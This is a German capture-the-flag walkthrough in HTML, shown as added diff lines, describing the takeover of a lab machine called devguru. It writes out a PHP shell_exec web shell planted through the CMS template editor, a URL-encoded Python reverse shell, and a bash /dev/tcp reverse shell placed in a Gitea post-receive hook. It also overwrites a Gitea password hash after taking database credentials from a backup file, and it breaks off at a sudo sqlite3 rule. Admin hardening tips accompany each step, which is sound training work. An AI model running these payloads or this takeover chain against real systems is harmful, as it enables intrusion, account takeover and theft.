+# Speichern der geänderten Seite.
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Wir finden im CMS-Backend eine Möglichkeit, den PHP-Code und das Markup einer Seite (hier der Homepage) zu bearbeiten.
+             1.  Wir fügen PHP-Code hinzu, der die PHP-Funktion `shell_exec()` verwendet, um den Wert des GET-Parameters `cmd` als Systembefehl auszuführen. Das Ergebnis des Befehls wird in einer Seitenvaiable `evilVar` gespeichert.
+             2.  Wir fügen im HTML/Markup-Teil der Seite einen Platzhalter `{{ this.page.evilVar }}` hinzu, der den Inhalt dieser Variable (also die Ausgabe unseres Shell-Befehls) anzeigt.
+             Diese Kombination ermöglicht es uns, beliebige Befehle über den `cmd`-Parameter in der URL der Homepage auszuführen und deren Ausgabe direkt im Browser zu sehen.</p>
+             <p class="evaluation">**Bewertung:** Wir haben erfolgreich eine Remote Code Execution (RCE)-Schwachstelle über die CMS-Template-Bearbeitung implementiert. Dies gibt uns die Möglichkeit, Befehle als der Benutzer auszuführen, unter dem der Webserver (Apache) läuft (typischerweise `www-data`).</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die RCE testen, indem die Homepage mit einem einfachen Befehl im `cmd`-Parameter aufgerufen wird (z.B. `http://devguru.local/?cmd=id`). Anschließend eine Reverse Shell aufbauen.
+             **Empfehlung (Admin):** Die Möglichkeit zur direkten PHP-Code-Ausführung in CMS-Templates einschränken oder deaktivieren, wenn möglich. Dateiberechtigungen so setzen, dass der Webserver-Benutzer keine Template-Dateien schreiben kann (erschwert jedoch Updates/Verwaltung). Regelmäßige Code-Audits durchführen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">curl http://devguru.local/?cmd=id 2>&1 | grep uid</span></div>
+                    <pre>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 13006    0 13006    0     0   126k      0 --:--:-- --:--:-- --:--:--  127k
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Wir verwenden `curl`, um die Homepage aufzurufen und den Befehl `id` über den `cmd`-Parameter zu übergeben. Wir leiten die Standardfehlerausgabe (`2`) in die Standardausgabe (`>&1`) um und filtern (`grep`) nach der Zeichenkette `uid`. Die Ausgabe `<span class="command">uid=33(www-data)...</span>` bestätigt, dass die RCE funktioniert und die Befehle als Benutzer `www-data` ausgeführt werden.</p>
+             <p class="evaluation">**Bewertung:** POC für die RCE erfolgreich.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Eine Reverse Shell mit einem geeigneten Payload über den `cmd`-Parameter starten.
+            **Empfehlung (Admin):** Siehe vorherige Empfehlung zur Absicherung der Template-Bearbeitung.</p>
+
+            <p class="comment">Wir bereiten den Empfang der Reverse Shell vor, indem wir einen Listener starten und den entsprechenden Payload über die RCE ausführen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+                    </pre>
+                </div>
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Aktion im Webbrowser oder via curl (Reverse Shell Payload)</span></div>
+                    <pre>
+# Aufruf der URL (URL-codierter Python Reverse Shell Payload):
+http://devguru.local/?cmd=python3%20-c%20%27import%20os,pty,socket;s=socket.socket();s.connect((%22<span class="command">192.168.2.109</span>%22,<span class="command">4444</span>));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(%22sh%22)%27
+                    </pre>
+                </div>
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.109] from (UNKNOWN) [192.168.2.107] 33162</span>
+$ <span class="command"># Shell erhalten!</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir starten einen Netcat-Listener auf unserer Angreifer-Maschine (`192.168.2.109`) auf Port `4444`. Anschließend rufen wir die Homepage des Ziels auf und übergeben einen URL-codierten Python3-Reverse-Shell-Payload im `cmd`-Parameter. Dieser Payload verbindet sich zurück zu unserem Listener und startet eine `sh`-Shell. Unser Listener meldet die eingehende Verbindung vom Ziel (`192.168.2.107`), und wir erhalten einen Shell-Prompt (`$`).</p>
+            <p class="evaluation">**Bewertung:** Initial Access als `www-data` erfolgreich! Wir haben eine Reverse Shell über die RCE-Schwachstelle im CMS erhalten.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Shell stabilisieren (`pty.spawn`, `stty raw -echo`, etc.). Die Umgebung als `www-data` erkunden und nach Wegen zur Privilege Escalation suchen.
+            **Empfehlung (Admin):** Sicherheitsvorfall! Die RCE-Schwachstelle im CMS beheben. Nach Persistenzmechanismen suchen. System überprüfen.</p>
+
+            <p class="comment">Wir stabilisieren die erhaltene Shell.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                    <div class="prompt">www-data@devguru:/var/www/html$ <span class="command">export TERM=xterm-256color</span></div>
+                    <div class="prompt">www-data@devguru:/var/www/html$ <span class="command"># (Ctrl+Z)</span></div>
+                    <pre>
+^Z
+<span class="password">zsh: suspended  nc -lvnp 4444</span>
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                    <pre>
+[1]  + continued  nc -lvnp 4444
+                    </pre>
+                    <div class="prompt"># <span class="command">(reset eingeben)</span></div>
+                    <span class="command">reset</span>
+                    <div class="prompt">www-data@devguru:/var/www/html$ <span class="command"># Stabilisierte Shell</span></div>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Wir führen die Standardprozedur zur Shell-Stabilisierung durch: Starten einer Bash mit `pty.spawn`, Setzen der `TERM`-Variable, Pausieren von `nc` mit `Ctrl+Z`, Setzen des lokalen Terminals auf `raw -echo` und Wiederaufnahme von `nc` mit `fg`. Optional `reset` zur Korrektur der Anzeige.</p>
+            <p class="evaluation">**Bewertung:** Wir haben nun eine voll funktionsfähige, interaktive Shell als Benutzer `www-data`.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Mit der Privilege Escalation beginnen. `sudo -l`, SUID-Dateien, Cronjobs, Konfigurationsdateien, laufende Prozesse etc. prüfen.
+            **Empfehlung (Admin):** Monitoring auf Shell-Stabilisierungsversuche.</p>
+        </section>
+
+        <section id="privesc-frank">
+            <h2>Privilege Escalation (www-data to frank via Gitea)</h2>
+            <p class="comment">Wir sind als `www-data` auf dem System und suchen nach Wegen, unsere Rechte zu erhöhen. Wir prüfen Standard-Vektoren wie `sudo` und SUID-Dateien, finden aber einen Hinweis auf eine Gitea-Konfigurationsdatei.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@devguru:/var/www/html$ <span class="command">sudo -l</span></div>
+                    <pre>
+[sudo] password for www-data: <span class="password"># Passwort unbekannt, sudo -l nicht direkt möglich</span>
+Sorry, try again.
+[sudo] password for www-data:
+Sorry, try again.
+[sudo] password for www-data:
+sudo: 3 incorrect password attempts
+                    </pre>
+                    <div class="prompt">www-data@devguru:/var/www/html$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+   273434    428 -rwsr-xr-x   1 root     root       436552 Feb  9  2018 /usr/lib/openssh/ssh-keysign
+   262515     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+   274024     80 -rwsr-xr-x   1 root     root        80056 Jun  5  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+   274114     16 -rwsr-xr-x   1 root     root        14328 Jul 13  2018 /usr/lib/policykit-1/polkit-agent-helper-1
+   262505     44 -rwsr-xr--   1 root     messagebus    42992 Nov 15  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   262244     76 -rwsr-xr-x   1 root     root          75824 Jan 25  2018 /usr/bin/gpasswd
+   262303     40 -rwsr-xr-x   1 root     root          40344 Jan 25  2018 /usr/bin/newgrp
+   262181     44 -rwsr-xr-x   1 root     root          44528 Jan 25  2018 /usr/bin/chsh
+   274085     40 -rwsr-xr-x   1 root     root          37136 Jan 25  2018 /usr/bin/newgidmap
+   262394    <span class="command">148 -rwsr-xr-x   1 root     root         149080 Jan 17  2018 /usr/bin/sudo</span>
+   273598     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
+   274086     40 -rwsr-xr-x   1 root     root          37136 Jan 25  2018 /usr/bin/newuidmap
+   274111     24 -rwsr-xr-x   1 root     root          22520 Jul 13  2018 /usr/bin/pkexec
+   262314     60 -rwsr-xr-x   1 root     root          59640 Jan 25  2018 /usr/bin/passwd
+   262179     76 -rwsr-xr-x   1 root     root          76496 Jan 25  2018 /usr/bin/chfn
+   273378     20 -rwsr-xr-x   1 root     root          18448 Mar  9  2017 /usr/bin/traceroute6.iputils
+   786493     44 -rwsr-xr-x   1 root     root          43088 May 16  2018 /bin/mount
+   786520     44 -rwsr-xr-x   1 root     root          44664 Jan 25  2018 /bin/su
+   792089    144 -rwsr-xr-x   1 root     root         146128 Nov 30  2017 /bin/ntfs-3g
+   786537     28 -rwsr-xr-x   1 root     root          26696 May 16  2018 /bin/umount
+   786502     64 -rwsr-xr-x   1 root     root          64424 Mar  9  2017 /bin/ping
+   792080     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
+                    </pre>
+                    <div class="prompt">www-data@devguru:/var/www/html$ <span class="command">echo $PATH</span></div>
+                    <pre>
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+                    </pre>
+                     <div class="prompt">www-data@devguru:/var/www/html$ <span class="command">ps aux | grep frank</span></div>
+                    <pre>
+<span class="command">frank</span>      838  0.1 10.5 1589892 215068 ?      Ssl  07:09   0:11 /usr/local/bin/gitea web --config /etc/gitea/app.ini
+www-data  2486  0.0  0.0  11464  1096 pts/1    S+   08:45   0:00 grep frank
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:**
+            *   `sudo -l`: Wir versuchen, die Sudo-Rechte für `www-data` zu prüfen, benötigen aber das Passwort, das wir nicht haben.
+            *   `find / -type f -perm -4000 -ls 2>/dev/null`: Die Suche nach SUID-Dateien zeigt nur Standard-Linux-Binaries. Es gibt keine offensichtlich unsicheren oder benutzerdefinierten SUID-Dateien. Die `sudo`-Version ist `1.8.21p2` (aus Dateidatum und Standard für Ubuntu 18.04 abgeleitet), die potenziell für einige CVEs anfällig sein könnte, aber das ist nicht der primäre Weg hier.
+            *   `echo $PATH`: Zeigt die Standard-Pfade.
+            *   `ps aux | grep frank`: Wir listen alle Prozesse auf und filtern nach "frank". Wir finden einen laufenden Gitea-Prozess, der vom Benutzer `<span class="command">frank</span>` gestartet wurde und die Konfigurationsdatei `/etc/gitea/app.ini` verwendet.</p>
+            <p class="evaluation">**Bewertung:** Standard-Enumeration wie `sudo -l` und SUID-Suche liefern keinen direkten Weg. Der Fund des Gitea-Prozesses, der als Benutzer `frank` läuft, ist jedoch sehr wichtig. Wenn wir Zugriff auf die Gitea-Konfiguration oder -Datenbank erhalten, könnten wir möglicherweise das Passwort für `frank` ändern oder anderweitig seine Rechte erlangen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Automatisierte Enumerationsskripte wie `linpeas.sh` oder `lse.sh` ausführen, um häufige Fehlkonfigurationen und Privesc-Vektoren zu finden. Die Gitea-Konfigurationsdatei (`/etc/gitea/app.ini`) untersuchen, falls Leserechte bestehen. Nach Backups oder anderen Orten suchen, an denen Konfigurationsdaten gespeichert sein könnten.
+            **Empfehlung (Admin):** Prozessüberwachung implementieren. Sicherstellen, dass Konfigurationsdateien korrekte Berechtigungen haben und keine sensiblen Daten leaken.</p>
+
+             <p class="comment">Wir führen `linpeas.sh` (oder ein ähnliches Skript) aus, das uns auf ein Backup der Gitea-Konfigurationsdatei hinweist.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@devguru:/tmp$ <span class="command">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</span></div>
+                    <pre>
+[...]
+<span class="password">Found the backup of the app.ini here : /var/backups/app.ini.bak</span>
+[...]
+                    </pre>
+                    <div class="prompt">www-data@devguru:/$ <span class="command">cat /var/backups/app.ini.bak</span></div>
+                    <pre>
+APP_NAME = Gitea: Git with a cup of tea
+RUN_USER = frank
+RUN_MODE = prod
+
+[database]
+<span class="command">DB_TYPE  = mysql</span>
+<span class="command">HOST     = 127.0.0.1:3306</span>
+<span class="command">NAME     = gitea</span>
+<span class="command">USER     = gitea</span>
+<span class="password">PASSWD   = UfFPTF8C8jjxVF2m</span>
+SSL_MODE = disable
+CHARSET  = utf8mb4
+LOG_SQL  = false
+PATH     = /var/lib/gitea/data/gitea.db
+
+[...]
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Das Enumerationsskript `linpeas.sh` findet eine Backup-Datei der Gitea-Konfiguration unter `<span class="password">/var/backups/app.ini.bak</span>`. Wir untersuchen diese Datei und finden im `[database]`-Abschnitt die Zugangsdaten für die Gitea-MySQL-Datenbank:
+             *   Benutzer: `<span class="command">gitea</span>`
+             *   Passwort: `<span class="password">UfFPTF8C8jjxVF2m</span>`
+             *   Datenbank: `gitea`
+             *   Host: `127.0.0.1:3306`</p>
+             <p class="evaluation">**Bewertung:** Ein weiterer kritischer Fund! Wir haben nun Zugangsdaten zur Gitea-Datenbank. In dieser Datenbank werden wahrscheinlich die Benutzerinformationen für Gitea gespeichert, einschließlich des Passwort-Hashes für den Benutzer `frank`.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Mit dem gefundenen Passwort (`<span class="password">UfFPTF8C8jjxVF2m</span>`) und Benutzer (`<span class="command">gitea</span>`) versuchen, sich über den MySQL-Client mit der Gitea-Datenbank zu verbinden. Die `user`-Tabelle suchen und den Eintrag für `frank` analysieren (insbesondere Hash und Salt).
+             **Empfehlung (Admin):** Backup-Dateien sollten ebenfalls gesichert werden und keine Klartext-Passwörter enthalten oder zumindest strenge Berechtigungen haben. Datenbank-Passwörter regelmäßig rotieren.</p>
+
+             <p class="comment">Wir verbinden uns mit der Gitea-MySQL-Datenbank und extrahieren den Passwort-Hash und Salt für den Benutzer `frank`.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@devguru:/var/www/html$ <span class="command">mysql -ugitea -pUfFPTF8C8jjxVF2m</span></div>
+                    <pre>
+Welcome to the MariaDB monitor. [...]
+Server version: 10.1.47-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04
+[...]
+MariaDB [(none)]> <span class="command">show databases;</span>
++--------------------+
+| Database           |
++--------------------+
+| <span class="command">gitea</span>              |
+| information_schema |
++--------------------+
+[...]
+MariaDB [(none)]> <span class="command">use gitea;</span>
+Database changed
+MariaDB [gitea]> <span class="command">show tables;</span>
++---------------------------+
+| Tables_in_gitea           |
++---------------------------+
+[...]
+| <span class="command">user</span>                      |
+[...]
++---------------------------+
+[...]
+MariaDB [gitea]> <span class="command">select name,salt,passwd,passwd_hash_algo as algo from user;</span>
++-------+------------+------------------------------------------------------------------------------------------------------+--------+
+| name  | salt       | passwd                                                                                               | algo   |
++-------+------------+------------------------------------------------------------------------------------------------------+--------+
+| <span class="command">frank</span> | <span class="command">Bop8nwtUiM</span> | <span class="password">c200e0d03d1604cee72c484f154dd82d75c7247b04ea971a96dd1def8682d02488d0323397e26a18fb806c7a20f0b564c900</span> | <span class="command">pbkdf2</span> |
++-------+------------+------------------------------------------------------------------------------------------------------+--------+
+1 row in set (0.00 sec)
+
+MariaDB [gitea]> <span class="command">exit</span>
+Bye
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir verbinden uns erfolgreich mit der MySQL-Datenbank als Benutzer `gitea` mit dem gefundenen Passwort. Wir wechseln zur `gitea`-Datenbank und listen die Tabellen auf, wobei wir die `user`-Tabelle finden. Wir fragen die relevanten Spalten (`name`, `salt`, `passwd`, `passwd_hash_algo`) aus der `user`-Tabelle ab. Wir erhalten:
+            *   Name: `<span class="command">frank</span>`
+            *   Salt: `<span class="command">Bop8nwtUiM</span>`
+            *   Passwort-Hash: `<span class="password">c200e...</span>`
+            *   Hashing-Algorithmus: `<span class="command">pbkdf2</span>` (PBKDF2 mit SHA256, Standard für Gitea)</p>
+            <p class="evaluation">**Bewertung:** Wir haben nun alle notwendigen Informationen (Passwort-Hash, Salt, Algorithmus) für den Gitea-Benutzer `frank`. Da wir den Hash nicht knacken können/wollen, besteht der Plan darin, das Passwort für `frank` auf ein bekanntes Passwort (z.B. `Benni1908`) zu ändern, indem wir einen neuen Hash mit dem bekannten Salt generieren und den alten Hash in der Datenbank überschreiben.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Ein Tool oder Skript finden/schreiben, das einen PBKDF2-SHA256-Hash mit dem gegebenen Salt (`<span class="command">Bop8nwtUiM</span>`) und unserem gewählten Passwort (`<span class="password">Benni1908</span>`) generiert. Den resultierenden Hash verwenden, um den Eintrag in der `user`-Tabelle der Gitea-Datenbank zu aktualisieren (z.B. mit einem `UPDATE`-Statement über den MySQL-Client).
+            **Empfehlung (Admin):** Datenbankzugriff schützen. Gitea aktuell halten.</p>
+
+            <p class="comment">Wir verwenden einen Go-Playground (oder ein lokales Go-Skript), um den neuen PBKDF2-Hash für das Passwort `Benni1908` mit dem Salt `Bop8nwtUiM` zu generieren.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Go Code (auf go.dev/play/ oder lokal)</span></div>
+                    <pre>
+package main
+
+import (
+	"crypto/sha256"
+	"fmt"
+	"golang.org/x/crypto/pbkdf2"
+)
+
+func main() {
+
+	var salt = "<span class="command">Bop8nwtUiM</span>"
+	var passwd = "<span class="password">Benni1908</span>"
+	var tempPasswd []byte
+	var saltBytes []byte
+
+	saltBytes = []byte(salt)
+
+	// Gitea verwendet standardmäßig 10000 Iterationen und eine Schlüssellänge von 50 Bytes für PBKDF2-SHA256
+	tempPasswd = pbkdf2.Key([]byte(passwd), saltBytes, 10000, 50, sha256.New)
+	fmt.Println(fmt.Sprintf("%x", tempPasswd))
+}
+
+                    </pre>
+                     <div class="prompt"># <span class="command">Ausgabe des Go-Programms:</span></div>
+                    <pre>
+<span class="password">7cd3d9cb8c195b36eb54ed0c8d4fb5672e87ffe52b5f60f6d8c917231307bd946b5f59720fbed2c22225c6d521e0f628d403</span>
+
+Program exited.
+                    </pre>
+                </div>
+            </div>
+              <p class="analysis">**Analyse:** Wir nutzen Go und dessen Krypto-Bibliotheken, um einen neuen Passwort-Hash zu generieren. Wir verwenden das bekannte Passwort (`<span class="password">Benni1908</span>`), den aus der Datenbank extrahierten Salt (`<span class="command">Bop8nwtUiM</span>`) und die Standardparameter von Gitea für PBKDF2 (10000 Iterationen, 50 Byte Schlüssellänge, SHA256). Das Programm gibt den neuen Hash im Hexadezimalformat aus: `<span class="password">7cd3d...</span>`.</p>
+              <p class="evaluation">**Bewertung:** Wir haben erfolgreich den korrekten Hash für unser gewünschtes Passwort generiert, der mit dem Salt und den Hashing-Parametern von Gitea kompatibel ist.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Diesen neuen Hash verwenden, um den alten Hash in der Datenbank für den Benutzer `frank` mittels eines `UPDATE`-SQL-Statements zu ersetzen.
+              **Empfehlung (Admin):** Interne Hashing-Mechanismen verstehen und sicher implementieren.</p>
+
+              <p class="comment">Wir aktualisieren den Passwort-Hash in der Gitea-Datenbank.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">www-data@devguru:/var/www/html$ <span class="command">mysql -ugitea -pUfFPTF8C8jjxVF2m -D gitea</span></div>
+                      <pre>
+MariaDB [gitea]> <span class="command">UPDATE user SET passwd="7cd3d9cb8c195b36eb54ed0c8d4fb5672e87ffe52b5f60f6d8c917231307bd946b5f59720fbed2c22225c6d521e0f628d403" where name="frank";</span>
+Query OK, 1 row affected (0.00 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+MariaDB [gitea]> <span class="command">exit</span>
+Bye
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:** Wir verbinden uns erneut mit der Gitea-Datenbank und führen ein `UPDATE`-Statement aus. Wir setzen das `passwd`-Feld für den Benutzer, dessen `name` "frank" ist, auf den neu generierten Hash (`<span class="password">7cd3d...</span>`). Die Datenbank bestätigt, dass eine Zeile geändert wurde.</p>
+              <p class="evaluation">**Bewertung:** Das Passwort für den Gitea-Benutzer `frank` wurde erfolgreich auf `<span class="password">Benni1908</span>` geändert.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Nun versuchen, sich bei der Gitea-Weboberfläche (`http://devguru.local:8585`) als `frank` mit dem Passwort `Benni1908` anzumelden.
+             **Empfehlung (Admin):** Datenbankänderungen protokollieren und überwachen.</p>
+        </section>
+
+        <section id="poc-gitea-hooks">
+             <h2>Proof of Concept 1 (Gitea Hooks - frank shell)</h2>
+             <p class="comment">Wir haben das Passwort für den Gitea-Benutzer `frank` geändert. Da der Gitea-Prozess als `frank` läuft, können wir versuchen, über Gitea eine Shell als dieser Benutzer zu erlangen. Eine bekannte Methode ist die Ausnutzung von Git Hooks.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Aktion im Webbrowser (Gitea Login & Repository Erstellung)</span></div>
+                     <pre>
+# Aufruf: http://devguru.local:8585/
+# Login mit:
+Username: <span class="command">frank</span>
+Password: <span class="password">Benni1908</span>
+# Ergebnis: <span class="password">Erfolgreicher Login</span>
+
+# Neues Repository erstellen:
+Repository Name: <span class="command">Benattack</span>
+Beschreibung: (Optional)
+[...] (Restliche Optionen Standard)
+[Create Repository]
+                     </pre>
+                    <div class="prompt"># <span class="command">Aktion im Webbrowser (Git Hook Konfiguration)</span></div>
+                     <pre>
+# Navigieren zum neuen Repository: Benattack -> Settings -> Git Hooks
+# Auswählen: <span class="command">post-receive</span> Hook
+# Einfügen des Hook Contents (Reverse Shell Payload):
+<span class="password">#!/bin/bash
+bash -i >& /dev/tcp/192.168.2.109/5555 0>&1</span>
+# [Update Hook] klicken.
+<span class="password">Hook updated successfully.</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:**
+             1.  Wir melden uns erfolgreich bei Gitea als `frank` an.
+             2.  Wir erstellen ein neues, leeres Repository namens `<span class="command">Benattack</span>`.
+             3.  Wir navigieren zu den Git-Hook-Einstellungen dieses Repositories. Git Hooks sind Skripte, die automatisch bei bestimmten Git-Ereignissen ausgeführt werden.
+             4.  Wir bearbeiten den `<span class="command">post-receive</span>`-Hook. Dieser Hook wird auf dem Server ausgeführt, *nachdem* ein erfolgreicher Push in das Repository stattgefunden hat.
+             5.  Wir fügen ein einfaches Bash-Skript als Hook-Inhalt ein. Dieses Skript versucht, eine interaktive Bash-Reverse-Shell zu unserer Angreifer-Maschine (<span class="command">192.168.2.109</span>) auf Port <span class="command">5555</span> aufzubauen.
+             Da der Gitea-Prozess als `frank` läuft, wird dieser Hook ebenfalls als `frank` ausgeführt.</p>
+             <p class="evaluation">**Bewertung:** Wir haben erfolgreich einen bösartigen Git-Hook konfiguriert. Sobald wir etwas in dieses Repository pushen, sollte der Hook ausgelöst werden und uns eine Reverse Shell als Benutzer `frank` geben.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Auf der Angreifer-Maschine einen Netcat-Listener auf Port `5555` starten. Ein lokales Git-Repository initialisieren, eine Dummy-Datei hinzufügen, committen und dann in das Gitea-Repository (`http://devguru.local:8585/frank/Benattack.git`) pushen.
+             **Empfehlung (Admin):** Die Möglichkeit zur Bearbeitung von Git Hooks über die Weboberfläche einschränken oder deaktivieren, wenn sie nicht benötigt wird. Gitea-Prozess mit minimal notwendigen Rechten ausführen.</p>
+
+             <p class="comment">Wir bereiten auf unserer lokalen Maschine ein Git-Repository vor und pushen es nach Gitea, um den Hook auszulösen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/devguru-hmv]
+└─# <span class="command">touch README.md</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~/devguru-hmv]
+└─# <span class="command">git config --global user.email "frank@devguru.local"</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/devguru-hmv]
+└─# <span class="command">git config --global user.name "frank"</span></div> <!-- Hinzugefügt für Vollständigkeit -->
+                    <div class="prompt">┌──(root㉿cyber)-[~/devguru-hmv]
+└─# <span class="command">git init</span></div>
+                    <pre>
+Leeres Git-Repository in /root/devguru-hmv/.git/ initialisiert
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~/devguru-hmv]
+└─# <span class="command">git add README.md</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~/devguru-hmv]
+└─# <span class="command">git commit -m "Initial commit"</span></div>
+                    <pre>
+[master (Root-Commit) 1a55581] Initial commit
+ 1 file changed, 0 insertions(+), 0 deletions(-)
+ create mode 100644 README.md
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~/devguru-hmv]
+└─# <span class="command">git remote add origin http://devguru.local:8585/frank/Benattack.git</span></div>
+                    <div class="prompt"># <span class="command">Listener auf Port 5555 starten (in anderem Terminal): nc -lvnp 5555</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~/devguru-hmv]
+└─# <span class="command">git push -u origin master</span></div>
+                    <pre>
+Username for 'http://devguru.local:8585': <span class="command">frank</span>
+Password for 'http://frank@devguru.local:8585': <span class="password">Benni1908</span>
+Objekte aufzählen: 3, fertig.
+Zähle Objekte: 100% (3/3), fertig.
+Schreibe Objekte: 100% (3/3), 208 Bytes | 208.00 KiB/s, fertig.
+Gesamt 3 (Delta 0), Wiederverwendet 0 (Delta 0), Pack wiederverwendet 0
+To http://devguru.local:8585/frank/Benattack.git
+ * [new branch]      master -> master
+Branch 'master' wurde aufgesetzt, um Remote-Branch 'master' von 'origin' zu verfolgen.
+<span class="password">Push erfolgreich! Hook wird ausgelöst...</span>
+                    </pre>
+                 </div>
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Netcat Listener auf Port 5555</span></div>
+                     <pre>
+┌──(root㉿cyber)-[~]
+└─# nc -lvnp 5555
+listening on [any] 5555 ...
+<span class="password">connect to [192.168.2.109] from (UNKNOWN) [192.168.2.107] 49552</span>
+bash: cannot set terminal process group (1339): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="command">frank@devguru</span>:~/gitea-repositories/frank/benattack.git$ <span class="command"># Shell als frank!</span>
+id
+<span class="command">uid=1000(frank) gid=1000(frank) groups=1000(frank)</span>
+                     </pre>
+                 </div>
+            </div>
+              <p class="analysis">**Analyse:**
+             1.  Wir initialisieren ein lokales Git-Repository, fügen eine Dummy-Datei hinzu und committen sie. Wir konfigurieren Git mit Benutzerdaten, die Gitea akzeptiert.
+             2.  Wir fügen das Gitea-Repository als Remote (`origin`) hinzu.
+             3.  Wir starten unseren Netcat-Listener auf Port 5555.
+             4.  Wir pushen den lokalen `master`-Branch zum Gitea-Repository. Wir authentifizieren uns mit `frank`/`Benni1908`.
+             5.  Der Push ist erfolgreich. Auf dem Server löst dies den `post-receive`-Hook aus.
+             6.  Unser Netcat-Listener empfängt die Verbindung, und wir erhalten eine Shell. Der `id`-Befehl bestätigt, dass wir nun als Benutzer `<span class="command">frank</span>` (uid=1000) agieren.</p>
+              <p class="evaluation">**Bewertung:** Die Privilege Escalation von `www-data` zu `frank` war erfolgreich! Wir haben die Kontrolle über den Gitea-Account genutzt, um über einen Git-Hook eine Shell als Benutzer `frank` zu erhalten.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die erhaltene `frank`-Shell stabilisieren. Nun erneut nach Privilege-Escalation-Vektoren suchen, um Root-Rechte zu erlangen. Insbesondere `sudo -l` für `frank` prüfen.
+             **Empfehlung (Admin):** Git Hooks als Angriffsvektor verstehen und absichern. Gitea sicher konfigurieren.</p>
+        </section>
+
+        <section id="poc-sqlite">
+             <h2>Proof of Concept 2 (Sudo sqlite3 - root shell)</h2>
+             <p class="comment">Wir haben nun eine Shell als Benutzer `frank`. Wir prüfen erneut die `sudo`-Berechtigungen, diesmal für `frank`, um einen Weg zu Root zu finden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">frank@devguru:~/gitea-repositories/frank/benattack.git$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for frank on devguru:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User frank may run the following commands on devguru:
+    <span class="password">(ALL, !root) NOPASSWD: /usr/bin/sqlite3</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Die Ausgabe von `sudo -l` für den Benutzer `frank` ist sehr spezifisch:
+             *   `frank` darf `/usr/bin/sqlite3` ausführen.
+             *   Dies darf er als jeder Benutzer (`ALL`) und jede Gruppe (`ALL`) tun, ABER explizit **nicht** als `root` (`!root`).
+             *   Es ist keine Passworteingabe erforderlich (`NOPASSWD`).
+             Die Einschränkung `!root` verhindert, dass wir einfach `sudo /usr/bin/sqlite3` oder `sudo -u root /usr/bin/sqlite3` ausführen können.</p>
